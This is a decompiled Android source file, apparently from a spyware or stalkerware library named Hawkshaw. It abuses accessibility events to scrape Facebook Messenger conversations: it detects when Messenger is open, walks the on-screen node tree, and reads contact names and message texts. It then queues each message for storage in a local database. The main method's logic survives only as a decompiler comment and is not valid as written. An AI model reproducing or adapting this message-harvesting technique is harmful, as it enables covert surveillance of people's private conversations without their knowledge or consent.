package com.hawkshaw.library.features.accessibility.socialmedia;

import Y1.K;
import android.view.accessibility.AccessibilityNodeInfo;
import com.hawkshaw.library.datalayer.room.socialmedia.UnprocessedSocialMediaEntity;

public final class FacebookMessenger {
    public static final FacebookMessenger INSTANCE = new FacebookMessenger();

    private FacebookMessenger() {
    }

    /* access modifiers changed from: private */
    public static final void extractMessages$lambda$0(UnprocessedSocialMediaEntity unprocessedSocialMediaEntity) {
        K.n(unprocessedSocialMediaEntity, "$entity");
        HandlerKt.insert(unprocessedSocialMediaEntity);
    }

    private final AccessibilityNodeInfo getLastChild(AccessibilityNodeInfo accessibilityNodeInfo) {
        if (accessibilityNodeInfo.getChildCount() == 0) {
            return accessibilityNodeInfo;
        }
        AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(accessibilityNodeInfo.getChildCount() - 1);
        K.m(child, "getChild(...)");
        return getLastChild(child);
    }

    /* JADX WARNING: Code restructure failed: missing block: B:12:0x003f, code lost:
        r6 = com.hawkshaw.library.features.accessibility.AccessibilityUtilsKt.getChildSafe(r3, 1);
     */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public final void extractMessages(android.view.accessibility.AccessibilityEvent r25, java.util.concurrent.ExecutorService r26) {
        /*
            r24 = this;
            r0 = r26
            java.lang.String r1 = "event"
            r2 = r25
            Y1.K.n(r2, r1)
            java.lang.String r1 = "executor"
            Y1.K.n(r0, r1)
            java.lang.CharSequence r1 = r25.getPackageName()
            java.lang.String r3 = "com.facebook.messenger.neue.MainActivity"
            boolean r1 = Y1.K.f(r1, r3)
            if (r1 != 0) goto L_0x001b
            return
        L_0x001b:
            android.view.accessibility.AccessibilityNodeInfo r1 = r25.getSource()
            if (r1 != 0) goto L_0x0022
            return
        L_0x0022:
            M1.b r2 = M1.b.f1293E
            android.view.accessibility.AccessibilityNodeInfo r1 = com.hawkshaw.library.features.accessibility.AccessibilityUtilsKt.findBy(r1, r2)
            if (r1 != 0) goto L_0x0036
            com.hawkshaw.library.features.accessibility.socialmedia.Researcher r0 = com.hawkshaw.library.features.accessibility.socialmedia.Researcher.INSTANCE
            java.lang.String r1 = "no recycler view"
            java.lang.String[] r1 = new java.lang.String[]{r1}
            r0.print((java.lang.String[]) r1)
            return
        L_0x0036:
            r2 = 0
            android.view.accessibility.AccessibilityNodeInfo r3 = com.hawkshaw.library.features.accessibility.AccessibilityUtilsKt.getChildSafe(r1, r2)
            r4 = 0
            r5 = 1
            if (r3 == 0) goto L_0x004a
            android.view.accessibility.AccessibilityNodeInfo r6 = com.hawkshaw.library.features.accessibility.AccessibilityUtilsKt.getChildSafe(r3, r5)
            if (r6 == 0) goto L_0x004a
            java.lang.CharSequence r6 = r6.getText()
            goto L_0x004b
        L_0x004a:
            r6 = r4
        L_0x004b:
            if (r3 == 0) goto L_0x0059
            r7 = 2
            android.view.accessibility.AccessibilityNodeInfo r7 = com.hawkshaw.library.features.accessibility.AccessibilityUtilsKt.getChildSafe(r3, r7)
            if (r7 == 0) goto L_0x0059
            java.lang.CharSequence r7 = r7.getText()
            goto L_0x005a
        L_0x0059:
            r7 = r4
        L_0x005a:
            if (r3 == 0) goto L_0x0067
            r8 = 3
            android.view.accessibility.AccessibilityNodeInfo r3 = com.hawkshaw.library.features.accessibility.AccessibilityUtilsKt.getChildSafe(r3, r8)
            if (r3 == 0) goto L_0x0067
            java.lang.CharSequence r4 = r3.getText()
        L_0x0067:
            int r3 = r1.getChildCount()
        L_0x006b:
            if (r5 >= r3) goto L_0x00e7
            android.view.accessibility.AccessibilityNodeInfo r8 = r1.getChild(r5)
            java.lang.String r9 = "getChild(...)"
            Y1.K.m(r8, r9)
            r9 = r24
            android.view.accessibility.AccessibilityNodeInfo r8 = r9.getLastChild(r8)
            java.lang.CharSequence r8 = r8.getText()
            if (r8 != 0) goto L_0x0083
            goto L_0x00e4
        L_0x0083:
            com.hawkshaw.library.datalayer.room.socialmedia.UnprocessedSocialMediaEntity r15 = new com.hawkshaw.library.datalayer.room.socialmedia.UnprocessedSocialMediaEntity
            com.hawkshaw.library.datalayer.models.PackageName r14 = com.hawkshaw.library.datalayer.models.PackageName.FACEBOOK_MESSENGER
            java.lang.StringBuilder r10 = new java.lang.StringBuilder
            r10.<init>()
            r10.append(r6)
            java.lang.String r11 = "-"
            r10.append(r11)
            r10.append(r8)
            r10.append(r11)
            r10.append(r14)
            java.lang.String r10 = r10.toString()
            int r11 = com.hawkshaw.library.ktextensions.StringsKt.hash((java.lang.String) r10)
            java.lang.String r12 = com.hawkshaw.library.ktextensions.StringsKt.getEmpty(r6)
            java.lang.StringBuilder r10 = new java.lang.StringBuilder
            r10.<init>()
            r10.append(r7)
            java.lang.String r13 = ", "
            r10.append(r13)
            r10.append(r4)
            java.lang.String r13 = r10.toString()
            java.lang.String r8 = com.hawkshaw.library.ktextensions.StringsKt.getEmpty(r8)
            com.hawkshaw.library.datalayer.room.socialmedia.SocialMediaEntity$Type r16 = com.hawkshaw.library.datalayer.room.socialmedia.SocialMediaEntity.Type.Unknown
            r20 = 256(0x100, float:3.59E-43)
            r21 = 0
            r17 = 0
            java.lang.String r18 = ""
            r19 = 0
            r10 = r15
            r22 = r14
            r14 = r17
            r23 = r15
            r15 = r8
            r17 = r22
            r10.<init>(r11, r12, r13, r14, r15, r16, r17, r18, r19, r20, r21)
            M1.a r8 = new M1.a
            r10 = r23
            r8.<init>(r10, r2)
            r0.execute(r8)
        L_0x00e4:
            int r5 = r5 + 1
            goto L_0x006b
        L_0x00e7:
            r9 = r24
            return
        */
        throw new UnsupportedOperationException("Method not decompiled: com.hawkshaw.library.features.accessibility.socialmedia.FacebookMessenger.extractMessages(android.view.accessibility.AccessibilityEvent, java.util.concurrent.ExecutorService):void");
    }
}
